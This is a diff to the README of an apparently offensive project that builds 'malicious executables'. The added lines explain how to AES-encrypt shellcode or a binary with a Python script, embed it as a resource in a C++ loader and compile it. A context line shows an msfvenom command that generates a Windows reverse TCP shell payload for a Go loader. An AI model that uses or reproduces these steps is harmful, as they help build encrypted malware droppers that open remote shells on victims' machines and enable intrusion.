@@ -10,7 +10,8 @@ This section lists all major frameworks/libraries used to create this project.
 1. Go 1.19.5
 2. Rust (nightly-x86_64-pc-windows-msvc toolchain)
 3. Python 3.10
-4. pycryptodomex
+4. Visual C++ 2022
+5. pycryptodomex
 
 
 <!-- GETTING STARTED -->
@@ -32,6 +33,23 @@ This section lists all major frameworks/libraries used to create this project.
 
 <!-- USAGE EXAMPLES -->
 ## Usage
+### For C++
+1. Choose if the malicious executable will contain a shellcode or a binary file.
+2. In case of a binary file, execute
+3. pip install crypto pycroptodome
+4. python encryptPy.py BIN_FILE_NAME
+5. Put the relevant AES key into the C++ code
+6. Insert the binary file as a resource, like "Resource-> Import -> Choose encrypted file -> Name it, e.g., FILE_RES"
+7. Change the Debug option to Release and compile the code
+
+Note: In case of the code to be unable to find "Crypto", find the installation folder of Python, with the following commands:
+```
+import os
+import sys
+os.path.dirname(sys.executable)
+```
+Go to this directory and find the "site-packages\crypto" folder and rename it to "Crypto". For instance, my path was "C:\Users\user\AppData\Local\Programs\Python\Python310\Lib\site-packages"
+
 ### For Go
 1. msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f go 
 2. Remove "\0x" and new line values
